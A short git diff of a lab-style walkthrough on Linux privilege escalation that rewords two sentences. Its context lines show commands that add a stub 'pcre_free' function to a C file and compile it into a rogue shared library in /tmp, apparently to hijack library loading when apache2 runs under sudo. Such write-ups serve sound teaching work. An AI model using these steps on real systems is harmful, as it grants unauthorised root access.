@@ -629,12 +629,12 @@ Attempting to run `apache2` with `sudo` however this time will display an error 
 
 ![image](https://user-images.githubusercontent.com/14150485/172321426-6c87fbd7-7c64-4fac-af09-03e14dd39428.png)
 
-There are multiple ways we can use to add this to the `library_path.c` file. The easiest way is for us to use the `echo` command to add a line at the end of the program with a void `pcre_free` function:
+There are multiple ways we can use to add this to the `library_path.c` file. The easiest one is to use the `echo` command to add a line at the end of the program with a void `pcre_free` function:
 
 ```
 echo "void pcre_free(){}" >> /home/user/tools/sudo/library_path.c
 ```
-The next step is to compile the new file:
+Before our new `sudo` attempt we need to compile the new shared file:
 
 ```
 gcc -o /tmp/libpcre.so.3 -shared -fPIC /home/user/tools/sudo/library_path.c
